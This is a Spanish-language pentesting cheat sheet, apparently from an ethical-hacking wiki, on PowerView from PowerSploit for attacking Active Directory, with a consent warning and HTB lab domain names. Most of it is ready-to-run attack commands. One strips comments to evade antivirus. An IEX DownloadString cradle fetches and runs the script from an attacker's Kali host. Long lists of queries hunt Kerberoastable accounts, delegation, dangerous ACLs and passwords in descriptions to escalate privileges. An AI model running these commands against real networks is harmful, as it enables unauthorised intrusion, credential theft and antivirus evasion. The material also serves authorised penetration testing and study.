
# PowerView

PowerView es parte del conjunto de herramientas de seguridad de red de PowerShell y se puede utilizar para automatizar y simplificar la enumeración, el análisis y la explotación de los sistemas de Active Directory en una red.

PowerView se ejecuta en una consola de PowerShell y proporciona una serie de comandos que permiten a los usuarios enumerar información sobre los usuarios, grupos, equipos y otros objetos de Active Directory.

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a conseguir credenciales y información sensible en una organización por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">PowerSploit</mark>

Podemos descargar PowerView desde la suite de PowerSploit, ademas de otras muchas herramientas.

1. Descargar el repo en local > Descargar .zip

{% embed url="<https://github.com/PowerShellMafia/PowerSploit>" %}

2. Extraer y ver carpeta Recon
3. PowerView\.ps1
4. Eliminar comentarios para hacer bypass de antivirus

```bash
sed '/<#/,/#>/d' PowerView.ps1 > powerview.ps1
```

### Enviar PowerView a máquina de empleado

{% code title="En Kali" %}

```bash
python3 -m http.server 80
```

{% endcode %}

```powershell
# Descargar PowerView
IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.52/PowerView.ps1')

# O desde memoria si ya está cargado
Import-Module .\PowerView.ps1
```

#### Ver todos los métodos de envío de archivos

{% content-ref url="/pages/nidKxJlqN0jQ1pHco7Rc" %}
[File Transfers](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/file-transfers.md)
{% endcontent-ref %}

***

## <mark style="color:purple;">PowerView Chetsheet</mark>

### 🏢D**ominio**

```ps
# Información básica del dominio
Get-Domain
Get-DomainController
Get-DomainController -Domain SIGNED.HTB

# Políticas de dominio
Get-DomainPolicy
(Get-DomainPolicy)."system access"
(Get-DomainPolicy)."kerberos policy"

# Trusts y relaciones
Get-DomainTrust
Get-DomainTrustMapping
Get-DomainTrust -Domain SIGNED.HTB
```

### 👥 **Usuarios**

```ps
# Todos los usuarios
Get-DomainUser
Get-DomainUser -Properties samaccountname,description,lastlogon,pwdlastset,logoncount,badpwdcount

# Usuarios interesantes
Get-DomainUser -Identity "administrator" -Properties *
Get-DomainUser -UACFilter PASSWD_NOTREQD -Properties samaccountname,description
Get-DomainUser -PreauthNotRequired -Properties samaccountname
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname

# Búsquedas específicas
Get-DomainUser -LDAPFilter "(description=*admin*)"
Get-DomainUser -LDAPFilter "(userPassword=*)"
Get-DomainUser -Properties samaccountname,pwdlastset | Where-Object {$_.pwdlastset -lt (Get-Date).AddDays(-180)}

# Usuarios que no requieren pre-autenticación
Get-DomainUser -PreauthNotRequired | select samaccountname,useraccountcontrol
```

### 🛡️ **Grupos**

```ps
# Todos los grupos
Get-DomainGroup
Get-DomainGroup -Properties name,description,members

# Grupos privilegiados
Get-DomainGroup -Identity "Domain Admins" -Properties members
Get-DomainGroup -Identity "Enterprise Admins" -Properties members
Get-DomainGroup -Identity "Administrators" -Properties members

# Grupos interesantes
Get-DomainGroup -LDAPFilter "(adminCount=1)" -Properties name,member,admincount
Get-DomainGroup -Identity "DnsAdmins" -Properties members
Get-DomainGroup -Identity "Backup Operators" -Properties members
Get-DomainGroup -Identity "Account Operators" -Properties members
Get-DomainGroup -Identity "Server Operators" -Properties members
Get-DomainGroup -Identity "Print Operators" -Properties members

# Miembros de grupos
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Enterprise Admins"
Get-DomainGroupMember -Identity "DnsAdmins"
```

### 💻 **Equipos**

```ps
# Todos los equipos
Get-DomainComputer
Get-DomainComputer -Properties name,operatingsystem,lastlogon

# Equipos interesantes
Get-DomainComputer -OperatingSystem "*Server*" -Properties name,operatingsystem
Get-DomainComputer -Unconstrained -Properties name,operatingsystem
Get-DomainComputer -TrustedToAuth -Properties name,operatingsystem
Get-DomainComputer -Printers -Properties name,operatingsystem

# Buscar sistemas vulnerables
Get-DomainComputer -UACFilter TRUSTED_FOR_DELEGATION -Properties name
Get-DomainComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```

### 🔑 **Servicios y SPNs**

```ps
# Service Principal Names
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
Get-DomainComputer -SPN | select name,serviceprincipalname

# Buscar servicios específicos
Get-DomainUser -SPN | ? {$_.serviceprincipalname -like "*sql*"}
Get-DomainUser -SPN | ? {$_.serviceprincipalname -like "*http*"}
Get-DomainUser -SPN | ? {$_.serviceprincipalname -like "*mssql*"}
```

### 🔄 **Delegación y constraints**&#x20;

```ps
# Unconstrained Delegation
Get-DomainComputer -Unconstrained -Properties name,operatingsystem
Get-DomainUser -Unconstrained -Properties samaccountname

# Constrained Delegation
Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth -Properties name,msds-allowedtodelegateto

# Resource Based Constrained Delegation
Get-DomainComputer -Properties name,msds-allowedtoactonbehalfofotheridentity
```

### 📋 **Objetos de Group Policy**

```ps
# GPOs
Get-DomainGPO
Get-DomainGPO -Properties displayname,whencreated,whenchanged

# GPOs por computadora
Get-DomainGPO -ComputerIdentity "DC01" -Properties displayname

# Buscar GPOs interesantes
Get-DomainGPO -LDAPFilter "(name=*password*)" -Properties displayname
Get-DomainGPO -LDAPFilter "(name=*admin*)" -Properties displayname
```

### 🔍 **Búsquedas Avanzadas**

```ps
# Buscar por descripción
Get-DomainUser -LDAPFilter "(description=*pass*)" -Properties samaccountname,description
Get-DomainUser -LDAPFilter "(description=*admin*)" -Properties samaccountname,description
Get-DomainUser -LDAPFilter "(description=*svc*)" -Properties samaccountname,description

# Cuentas con password no expira
Get-DomainUser -UACFilter DONT_EXPIRE_PASSWORD -Properties samaccountname,pwdlastset

# Cuentas deshabilitadas
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties samaccountname
```

### 🗺️ **ACLs y permisos**

```ps
# Enumerar ACLs
Get-DomainObjectAcl -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -match "WriteProperty"}
Find-InterestingDomainAcl

# Buscar permisos de escritura
Get-DomainObjectAcl -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -match "GenericAll"}
Get-DomainObjectAcl -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -match "WriteDacl"}

# Verificar si tenemos permisos peligrosos
Invoke-ACLScanner -Principal "mssqlsvc"
```

### 📊 **Sesiones y Logins**

```ps
# Sessions activas
Get-NetSession -ComputerName DC01
Get-NetLoggedon -ComputerName DC01

# Procesos en ejecución
Get-NetProcess -ComputerName DC01 | select ProcessName,User

# Shares de red
Get-NetShare -ComputerName DC01
Get-NetFileServer
```

### 🎯 **COMANDOS MÁS IMPORTANTES PARA ESCALADA**

```ps
# 1. Buscar usuarios con SPN (Kerberoastable)
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# 2. Buscar delegación sin restricciones
Get-DomainComputer -Unconstrained | select name

# 3. Buscar delegación restringida
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto

# 4. Buscar permisos peligrosos
Find-InterestingDomainAcl | select IdentityReference,ActiveDirectoryRights

# 5. Buscar DnsAdmins (muy peligroso)
Get-DomainGroupMember -Identity "DnsAdmins" | select MemberName

# 6. Buscar descriptores de seguridad interesantes
Get-DomainUser -LDAPFilter "(adminCount=1)" | select samaccountname

# 7. Buscar GPOs con passwords
Get-DomainGPO -LDAPFilter "(name=*password*)" | select displayname
```

***

### 📝 **EJECUCIÓN POR LOTES RECOMENDADA**

```ps
# Ejecutar estos comandos clave
$commands = @(
    'Get-Domain',
    'Get-DomainController',
    'Get-DomainUser -SPN | select samaccountname,serviceprincipalname',
    'Get-DomainGroupMember -Identity "Domain Admins"',
    'Get-DomainGroupMember -Identity "DnsAdmins"',
    'Get-DomainComputer -Unconstrained | select name',
    'Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto',
    'Find-InterestingDomainAcl | select IdentityReference,ActiveDirectoryRights'
)

$commands | ForEach-Object { 
    Write-Host "=== Ejecutando: $_ ===" -ForegroundColor Yellow
    Invoke-Expression $_
    Write-Host ""
}
```

***

En las siguientes secciones veremos como enumerar sistemas Active Directory con PowerView y sin PowerView.
